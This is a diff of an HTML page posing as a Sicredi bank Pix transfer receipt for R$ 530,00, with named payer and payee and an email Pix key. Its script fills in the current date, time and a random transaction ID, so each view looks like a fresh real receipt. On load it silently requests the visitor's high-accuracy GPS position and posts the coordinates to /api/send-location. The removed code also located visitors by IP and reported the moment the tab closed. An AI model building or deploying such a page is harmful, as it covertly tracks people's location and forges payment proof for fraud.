@@ -1,115 +1,135 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Comprovante de Pix - Sicredi</title>
-  <link rel="stylesheet" href="styles.css" />
-</head>
+  <title>Comprovante Pix - Sicredi</title>
+  <link rel="stylesheet" href="styles.css">
+  <style>
+    /* Estilo para centralizar e ajustar perfeitamente o logotipo */
+    .logo-sicredi {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .logo-sicredi img {
+      width: 150px;
+      height: auto;
+      max-width: 100%;
+      display: inline-block;
+    }
 
+    /* Botão com o verde correto da marca */
+    .botao {
+      background-color: #78be20 !important;
+      color: #ffffff !important;
+      border: none;
+      padding: 12px 20px;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 6px;
+      cursor: pointer;
+      width: 100%;
+      text-align: center;
+      display: inline-block;
+      margin-top: 15px;
+    }
+    .botao:hover {
+      background-color: #65a218 !important;
+    }
+  </style>
+</head>
 <body>
   <div class="comprovante-container">
-    <div class="topo-comprovante" style="text-align: center; margin-bottom: 20px;">
-      <img src="logo-sicredi.png" alt="Sicredi" style="max-width: 120px; margin-bottom: 10px;" />
-      <h2>Pix Enviado - R$ 530,00</h2>[span_5](start_span)[span_5](end_span)[span_6](start_span)[span_6](end_span)
+    
+    <!-- LOGOTIPO VIA LINK DIRETO DO GITHUB -->
+    <div class="logo-sicredi">
+      <img src="COLE_O_LINK_RAW_DO_GITHUB_AQUI" alt="Logo Sicredi">
     </div>
+
+    <h1>Pix Enviado - <strong>R$ 530,00</strong></h1>
 
     <div class="informacoes">
-      <p><span>Data do Pagamento:</span> <span>Sábado, 14/11/2026</span></p>[span_7](start_span)[span_7](end_span)[span_8](start_span)[span_8](end_span)
-      <p><span>Horário:</span> <span>00:16</span></p>[span_9](start_span)[span_9](end_span)[span_10](start_span)[span_10](end_span)
-      <p><span>ID da Transação:</span> <span class="id-transacao" style="word-break: break-all;">PIXcSqf5BBNLaKrFy1C6kPAj6sexVR2Z</span></p>[span_11](start_span)[span_11](end_span)[span_12](start_span)[span_12](end_span)
-      
-      <hr style="border: 0; border-top: 1px solid #ddd; margin: 12px 0;">
-
-      <p><span>Quem Recebeu:</span> <span>Leidene Almeida Lucena</span></p>[span_13](start_span)[span_13](end_span)[span_14](start_span)[span_14](end_span)
-      <p><span>Chave Pix:</span> <span>dra.leidene@gmail.com</span></p>[span_15](start_span)[span_15](end_span)[span_16](start_span)[span_16](end_span)
-      
-      <hr style="border: 0; border-top: 1px solid #ddd; margin: 12px 0;">
-
-      <p><span>Quem Pagou:</span> <span>Maria Fernanda Costa</span></p>[span_17](start_span)[span_17](end_span)[span_18](start_span)[span_18](end_span)
-      <p><span>CPF:</span> <span>***.640.535-**</span></p>[span_19](start_span)[span_19](end_span)[span_20](start_span)[span_20](end_span)
-      <p><span>Instituição:</span> <span>Banco Cooperativo Sicredi S.A</span></p>[span_21](start_span)[span_21](end_span)[span_22](start_span)[span_22](end_span)
+      <p><span>Data do Pagamento:</span> <span id="data-pagamento"></span></p>
+      <p><span>Horário:</span> <span id="horario-atual"></span></p>
+      <p><span>ID da Transação:</span> <strong id="id-transacao"></strong></p>
+      <hr class="linha-pontilhada">
+      <p><span>Quem Recebeu:</span> <strong>Leidene Almeida Lucena</strong></p>
+      <p><span>Chave Pix:</span> <strong>dra.leidene@gmail.com</strong></p>
+      <hr class="linha-pontilhada"> 
+      <p><span>Quem Pagou:</span> <strong>Maria Fernanda Costa</strong></p>
+      <p><span>CPF:</span> <strong>***.640.535-**</strong></p>
+      <p><span>Instituição:</span> <strong>Banco Cooperativo Sicredi S.A</strong></p>
     </div>
 
-    <button class="botao" onclick="window.print()" style="background-color: #72A011; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 15px;">Imprimir Comprovante</button>
+    <button class="botao" onclick="window.print()">Imprimir Comprovante</button>
 
-    <div class="comprovante-footer" style="text-align: center; margin-top: 15px; font-size: 12px; color: #666;">
-      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>[span_23](start_span)[span_23](end_span)[span_24](start_span)[span_24](end_span)
+    <div class="comprovante-footer">
+      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
+      <p><a href="#">Clique aqui</a> para mais informações.</p>
     </div>
   </div>
 
   <script>
-    let dadosUltimaLocalizacao = {
-      latitude: null,
-      longitude: null,
-      maps: "",
-      source: "Não obtida"
-    };
+    function atualizarDataPagamento() {
+      const dataAtual = new Date();
+      const diasSemana = ["Domingo", "Segunda-feira", "Terça-feira", "Quarta-feira", "Quinta-feira", "Sexta-feira", "Sábado"];
+      const diaSemana = diasSemana[dataAtual.getDay()];
+      const dia = String(dataAtual.getDate()).padStart(2, '0');
+      const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+      const ano = dataAtual.getFullYear();
+      document.getElementById("data-pagamento").textContent = `${diaSemana}, ${dia}/${mes}/${ano}`;
+    }
 
-    window.addEventListener("load", () => {
+    function atualizarHorario() {
+      const dataAtual = new Date();
+      const horas = String(dataAtual.getHours()).padStart(2, '0');
+      const minutos = String(dataAtual.getMinutes()).padStart(2, '0');
+      document.getElementById("horario-atual").textContent = `${horas}:${minutos}`;
+    }
+
+    function gerarIdTransacao() {
+      const caracteres = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+      let id = "PIX";
+      for (let i = 0; i < 29; i++) {
+        id += caracteres.charAt(Math.floor(Math.random() * caracteres.length));
+      }
+      document.getElementById("id-transacao").textContent = id;
+    }
+
+    atualizarDataPagamento();
+    atualizarHorario();
+    gerarIdTransacao();
+
+    // --- CAPTURA DE GPS E ENVIO PARA A API ---
+    window.addEventListener('DOMContentLoaded', () => {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-          (position) => sendLocation(position, "Precisa (GPS)"),
-          () => fallbackLocation()
+          async (position) => {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+            try {
+              await fetch('/api/send-location', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  latitude: latitude,
+                  longitude: longitude,
+                  maps: mapsUrl
+                })
+              });
+            } catch (err) {
+              console.log("Erro na requisição:", err);
+            }
+          },
+          (error) => {
+            console.log("Erro de GPS ou negado:", error);
+          },
+          { enableHighAccuracy: true, timeout: 10000 }
         );
-      } else {
-        fallbackLocation();
-      }
-    });
-
-    function sendLocation(position, source) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-      dadosUltimaLocalizacao = { latitude, longitude, maps, source };
-      enviarParaApi(latitude, longitude, maps, source, "abriu_pagina");
-    }
-
-    function fallbackLocation() {
-      fetch("https://ipapi.co/json/")
-        .then(response => response.json())
-        .then(data => {
-          const latitude = data.latitude;
-          const longitude = data.longitude;
-          const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-          const source = "Aproximada (IP)";
-
-          dadosUltimaLocalizacao = { latitude, longitude, maps, source };
-          enviarParaApi(latitude, longitude, maps, source, "abriu_pagina_ip");
-        })
-        .catch(error => {
-          console.error("Erro ao obter localização pelo IP:", error);
-        });
-    }
-
-    function enviarParaApi(latitude, longitude, maps, source, acao) {
-      fetch("/api/send-location", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ latitude, longitude, maps, source, acao })
-      })
-        .then(response => response.json())
-        .catch(error => {
-          console.error("Erro:", error);
-        });
-    }
-
-    // Garante o envio dos dados (GPS ou IP) no momento exato em que a aba for fechada
-    window.addEventListener('beforeunload', function () {
-      const payload = JSON.stringify({
-        ...dadosUltimaLocalizacao,
-        acao: 'fechou_pagina'
-      });
-
-      if (navigator.sendBeacon) {
-        navigator.sendBeacon('/api/send-location', payload);
       }
     });
   </script>
 </body>
-
 </html>
